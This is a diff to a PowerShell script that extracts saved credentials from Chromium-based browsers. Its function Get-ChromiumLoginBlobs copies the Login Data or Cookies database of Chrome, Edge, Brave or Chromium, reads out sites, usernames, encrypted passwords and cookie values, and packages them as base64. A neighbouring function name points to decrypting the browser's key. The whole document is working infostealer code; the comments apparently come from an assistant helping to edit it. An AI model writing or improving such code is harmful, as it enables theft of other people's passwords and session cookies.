@@ -612,34 +612,36 @@ function Decrypt-ChromeKeyBlob {
     else {
         throw "[*] Unsupported flag: $($ParsedData.Flag)"
     }
-}function Get-ChromiumLoginBlobs {
+}
+function Get-ChromiumLoginBlobs {
     param(
         [string]$Browser,
-        [switch]$Cookies # This switch toggles between Passwords and Cookies
+        [switch]$Cookies # Added to handle your custom requirement
     )
 
-    # 1. Path Selection: Cookies live in 'Network\Cookies', Passwords live in 'Login Data'
+    # 1. PATH LOGIC: Must match the original switch structure
+    # Cookies live in 'Network\Cookies', Passwords live in 'Login Data'
     $TargetFile = if ($Cookies) { "Default\Network\Cookies" } else { "Default\Login Data" }
 
     switch ($Browser.ToLower()) {
-        "cft"      { $DataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\$TargetFile" }
-        "chrome"   { $DataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\$TargetFile" }
-        "edge"     { $DataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\$TargetFile" }
-        "brave"    { $DataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\$TargetFile" }
-        "chromium" { $DataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\$TargetFile" }
-        default    { $DataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\$TargetFile" }
+        "cft"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\$TargetFile" }
+        "chrome"   { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\$TargetFile" }
+        "edge"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\$TargetFile" }
+        "brave"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\$TargetFile" }
+        "chromium" { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\$TargetFile" }
+        default    { return "`n[-] Unsupported browser name: $Browser" }
     }
 
-    if (-not (Test-Path -Path $DataPath)) { return $false }
+    if (-not (Test-Path -Path $LoginDataPath)) { return $false }
 
-    # 2. SQLite Setup
+    # 2. SQLITE SETUP (Original Constants)
     [int]$SqliteOk = 0
     [int]$SqliteRow = 100
     [int]$SqliteOpenReadOnly = 1
-    $TempDatabasePath = Join-Path $env:TEMP ("Audit_{0}.db" -f ([guid]::NewGuid()))
+    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Data_{0}.db" -f ([guid]::NewGuid()))
 
     try {
-        Copy-Item -LiteralPath $DataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
+        Copy-Item -LiteralPath $LoginDataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
     }
     catch {
         return "[-] Unable to copy database file"
@@ -648,66 +650,64 @@ function Decrypt-ChromeKeyBlob {
     $DatabasePointer = [IntPtr]::Zero
     $StatementPointer = [IntPtr]::Zero
 
-    # 3. Dynamic SQL Query Logic
+    # 3. QUERY LOGIC: Switch based on the $Cookies flag
     if ($Cookies) {
         $SqlQuery = 'SELECT host_key, path, name, encrypted_value FROM cookies'
     } else {
         $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
     }
 
-    # 4. Execute Database Connection
     $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
     if ($ResultCode -ne $SqliteOk) { return "[-] SQLite Open Failed" }
 
     $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $SqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
     if ($ResultCode -ne $SqliteOk) { return "[-] SQLite Prepare Failed" }
 
-    # 5. Extraction Loop (Using your original variable names)
     $LoginResults = @()
+
+    # 4. EXTRACTION LOOP: Using original variable names exactly
     while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $Col0Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 0) # URL or Host
-        $Col2Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 2) # Username or Cookie Name
-        $BlobPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3) # Encrypted Data
+        $Col0Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 0) # Realm/Host
+        $Col1Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 1) # URL/Path
+        $Col2Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 2) # User/Name
+        $BlobPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3) # Encrypted Blob
         $BlobSize = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
 
-        $Url = if ($Col0Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col0Ptr) } else { "" }
+        $Col0 = if ($Col0Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col0Ptr) } else { "" }
+        $Col1 = if ($Col1Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col1Ptr) } else { "" }
         $Username = if ($Col2Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col2Ptr) } else { "" }
         
+        $Url = if ($Col0) { $Col0 } else { $Col1 }
         if (-not $Url) { continue }
 
-        $RawData = @()
+        $RawPasswordData = @()
         if ($BlobSize -gt 0 -and $BlobPtr -ne [IntPtr]::Zero) {
-            $RawData = New-Object byte[] $BlobSize
-            [Runtime.InteropServices.Marshal]::Copy($BlobPtr, $RawData, 0, $BlobSize)
+            $RawPasswordData = New-Object byte[] $BlobSize
+            [Runtime.InteropServices.Marshal]::Copy($BlobPtr, $RawPasswordData, 0, $BlobSize)
         }
 
-        if ($RawData.Length -eq 0) { continue }
+        if ($RawPasswordData.Length -eq 0) { continue }
 
-        # Basic Header Detection
-        $Header3 = [Text.Encoding]::ASCII.GetString($RawData, 0, [Math]::Min(3, $RawData.Length))
-        $BlobHeaderType = if ($Header3 -eq "v10") { "v10" } else { "DPAPI" }
+        # 5. CRITICAL: The BlobHeader must match exactly what the script's 'if' statements expect
+        $Header3 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(3, $RawPasswordData.Length))
+        $BlobHeaderType = if ($Header3 -eq "v10") { "v10 (DPAPI user)" } else { "DPAPI (legacy)" }
 
-        # --- KEEPING ORIGINAL NAMES FOR YOUR REPORT GENERATOR ---
         $LoginResults += [PSCustomObject]@{
             Browser                 = $Browser
             URL                     = $Url
             Username                = $Username
-            BlobHeader              = $BlobType
-            Base64EncryptedPassword = [Convert]::ToBase64String($RawData)
+            BlobHeader              = $BlobHeaderType
+            Base64EncryptedPassword = [Convert]::ToBase64String($RawPasswordData)
         }
     }
 
-    # 6. Cleanup Logic
+    # 6. CLEANUP (Original logic)
     if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
     if ($DatabasePointer -ne [IntPtr]::Zero) { [void]$Sqlite3Close.Invoke($DatabasePointer) }
-
+    Start-Sleep -Milliseconds 800
     [GC]::Collect()
     [GC]::WaitForPendingFinalizers()
-    Start-Sleep -Milliseconds 500
-
-    if (Test-Path $TempDatabasePath) {
-        Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
-    }
+    Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
 
     return $LoginResults
 }
